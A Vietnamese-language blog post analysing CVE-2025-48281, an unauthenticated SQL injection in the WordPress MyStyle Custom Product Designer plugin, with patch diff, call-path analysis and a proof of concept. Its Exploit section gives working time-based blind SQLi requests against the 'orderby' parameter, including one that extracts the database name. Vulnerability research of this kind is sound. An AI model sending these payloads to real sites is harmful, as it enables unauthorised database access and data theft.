---
title: CVE-2025-48281 Analysis & POC
description: Security Vulnerability in WordPress MyStyle Custom Product Designer Plugin.
date: 2025-09-27 19:00:00 +0700
categories: [CVE Analyst]
tags: [analyst, plugin, sqli]
images: ["app.png"]
featuredImage: "app.png"

lightgallery: true

toc:
  auto: false
---

<!--more-->

Lỗ hổng tồn tại trong plugin **MyStyle Custom Product Designer** của WordPress trước phiên bản **3.21.2**. Lỗ hổng này cho phép kẻ tấn công tương tác trực tiếp với cơ sở dữ liệu, bao gồm khả năng trích xuất hoặc thao túng dữ liệu.

* **CVE ID**: [CVE-2025-48281](https://www.cve.org/CVERecord?id=CVE-2025-48281)
* **Sản phẩm**: [WordPress MyStyle Custom Product Designer Plugin](https://wordpress.org/plugins/mystyle-custom-product-designer)
* **Loại lỗ hổng**: SQL Injection
* **Phiên bản bị ảnh hưởng**: <= 3.21.1
* **Mức độ nghiêm trọng (CVSS)**: Cao (9.3)
* **Yêu cầu đặc quyền**: Không cần xác thực

## Requirements

* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/).
* **MyStyle Custom Product Designer**: v3.21.1 (có lỗ hổng) và v3.21.2 (đã vá)
* **Công cụ diff**: **meld** hoặc bất kỳ công cụ so sánh phiên bản nào
* **WooCommerce plugin**: phải được kích hoạt trước khi cài đặt MyStyle vì plugin này sử dụng một số hàm từ WooCommerce

## Analysis

Nguyên nhân chính là việc ứng dụng chèn trực tiếp dữ liệu từ tham số **GET** vào câu truy vấn SQL mà không có biện pháp xác thực hợp lệ.

### Patch Diff

Dưới đây là sự khác biệt giữa hai phiên bản (3.21.1 và 3.21.2) trong file **includes/entities/class-mystyle-designmanager.php**.

{{< figure src="patch_diff.png" caption="So sánh bản vá" alt="Bản vá khác biệt" >}}

Bản vá mới đã thêm danh sách **whitelist** `$allowed_orderby` để chỉ cho phép sắp xếp theo các cột hợp lệ. Nếu giá trị `orderby` không nằm trong danh sách, nó sẽ tự động bị thay thế bằng `'ms_design_id'`, ngăn chặn chèn mã độc SQL.

## How it works

Lỗ hổng nằm trong hàm `get_designs` thuộc class `MyStyle_DesignManager` (file **includes/entities/class-mystyle-designmanager.php**).
Hàm này được gọi bởi các hàm như `get_items`, `init_index_request`, và một số hàm kiểm thử.

{{< figure src="search_1.png" caption="Kết quả tìm kiếm get_designs" alt="Tìm kiếm hàm get_designs" >}}

Vì đây là lỗ hổng **unauthenticated**, cần xác định hàm nào có thể được gọi mà không yêu cầu đăng nhập.
Kết quả cho thấy chỉ có `init_index_request` có thể bị khai thác trực tiếp qua URL `/designs/`.

{{< figure src="chart.png" caption="Luồng tấn công logic" alt="Luồng xử lý" >}}

## Exploit

### Kiểm tra SQLi

Gửi request chứa payload SQLi để kiểm tra:

```http
GET /designs/?orderby=(SELECT+SLEEP(5)) HTTP/1.1
Host: localhost
...
Cookie: cookie_here
```

Câu truy vấn kết quả:

```sql
SELECT * FROM wp_mystyle_designs WHERE ms_access = 0 ORDER BY (SELECT SLEEP(5)) ASC LIMIT 25 OFFSET 0
```

Nếu phản hồi chậm 5 giây → payload hoạt động.

{{< figure src="time_resp.png" caption="Kiểm tra độ trễ thời gian" alt="Kết quả phản hồi thời gian" >}}

> Không thêm dấu comment (`--`) sau `SLEEP()` vì sẽ khiến SQL parser lỗi do xuống dòng giữa `ASC` và `OFFSET`.

{{< figure src="debug.png" caption="Debug lỗi" alt="Debug lỗi cú pháp" >}}

### Lấy ký tự đầu tiên của tên cơ sở dữ liệu

```http
GET /designs/?orderby=IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1) HTTP/1.1
Host: localhost
...
Cookie: cookie_here
```

Nếu phản hồi chậm → ký tự đầu tiên của tên database là **w**.
Kỹ thuật này có thể được mở rộng để trích xuất toàn bộ tên cơ sở dữ liệu hoặc bảng dữ liệu.

## Conclusion

Lỗ hổng **CVE-2025-48281** trong plugin **MyStyle Custom Product Designer** (<= 3.21.1) xuất phát từ việc đưa trực tiếp dữ liệu người dùng vào truy vấn SQL mà không xác thực đúng cách.

Bản vá **3.21.2** đã khắc phục bằng cách áp dụng danh sách cột cho phép (`whitelist`) và kiểm tra giá trị đầu vào.

**Bài học rút ra:**

* Luôn xác thực dữ liệu đầu vào.
* Khi làm việc với cơ sở dữ liệu trong WordPress, **bắt buộc dùng `$wpdb->prepare()`**.
* Thường xuyên cập nhật plugin để tránh trở thành mục tiêu tấn công.

## References

[SQL Injection Cheat Sheet - PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)

[WordPress MyStyle Custom Product Designer Plugin <= 3.21.1 SQL Injection](https://patchstack.com/database/wordpress/plugin/mystyle-custom-product-designer/vulnerability/wordpress-mystyle-custom-product-designer-3-21-1-sql-injection-vulnerability)
